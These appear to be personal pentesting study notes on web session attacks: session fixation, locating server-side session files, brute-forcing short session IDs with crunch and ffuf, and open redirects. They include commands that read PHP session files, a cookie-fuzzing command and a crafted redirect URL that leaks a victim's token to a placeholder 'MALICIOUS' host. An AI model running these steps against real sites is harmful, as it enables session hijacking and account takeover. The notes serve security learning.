# Session Fixation Attack
This attack happens when the attacker can trick the user into loggin in a website by using a token/cookie that is known to the attacker ; thus we can login with it and steal user's session as we already know it.
### Scenarios
This can happen upon determinate scenarios where the cookie/token transit into URL(not only into headers):
1)if you surf into a website as non auth user and you get a token into url example: http://oredirect.htb.net/?redirect_uri=/complete.html&token=5lhuniqhg072sqk9a2merdtjtt
As you see upon login a redirect is performed via HTTP rewrite from the backend webserver, and in the URL a token is contained which means we could craft a URL and send it to the victim.
Upon click and use by the victim we should be able to sniff and steal the session as we already know this token!
2)Another alternative could happen if the site gives u the possibility to login/register a username and upon login into website you get a token/cookie, this can be used aswell in a special crafter request sent to the victim to trick them
and successfully steal back the session as the cookie is valid(accepted by backend) and we already know is so is a WIN-WIN situation.
### Where to find token/cookies(LOCALLY)?
1)PHP Webserver
If you got access to the web-servers back-end you need to locate the PHP settings that indicate where the php session cookies are saved to:
```
locate php.ini
cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
```
2)Usually they might be here(got from step 1)
```
ls /var/lib/php/sessions
cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
```
### Javascript
The Manager element represents the session manager that is used to create and maintain HTTP sessions of a web application
1)Cookie are saved as **SESSIONS.ser**
### .Net
Donet session can be found in:
1)The application worker process **aspnet_wp.exe** - This is the case in the InProc Session mode
2)**StateServer** (A Windows Service residing on IIS or a separate server) - This is the case in the OutProc Session mode 
3)An SQL Server


# Weak SESSID scenario
As the title says this particular attack happens when the back-end uses weak session ID(short) thus they could be cracked!
### Scenario 1 (Short sessid):
You find that back-end assign you a weak session id ex **sessID:eogz** this could be fuzzed:
1)Create a wordlist of 4 lowerchars:  `crunch 4 4 "abcdefghijklmnopqrstuvwxyz1234567890" -o wordlist.txt`
2)Fuzz the crap out of it: `ffuf -u http://127.0.0.1/profile.php -b 'sessionID=FUZZ' -w wordlist.txt` 
### Scenario 2 (Weak Randomness):
This happens when the entropy uses a low randomness which could be identified in the pattern used.
1)Send the login request to **Burp --> Sequencer**
2)Check that Token Location Within Response field and that the Cookie option is selected


# Open Redirect Attack
This kind of attack happens when we(attacker) can trick the victim into redirecting his session to another URL(webserver) that we host and have access to it! By doing so we are able to sniff victim's session and so on!
### Example:
A legit app is performing a URL redirect via HTTP GET: `http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>`
If we see following values:
```
    ?url=
    ?link=
    ?redirect=
    ?redirecturl=
    ?redirect_uri=
    ?return=
    ?return_to=
    ?returnurl=
    ?go=
    ?goto=
    ?exit=
    ?exitpage=
    ?fromurl=
    ?fromuri=
    ?redirect_to=
    ?next=
    ?newurl=
    ?redir=
```
Then we want to try to redirect to our machine example:
```
http://oredirect.htb.net/?redirect_uri=http://MALICIOUS/&token=<RANDOM TOKEN ASSIGNED BY THE APP>
```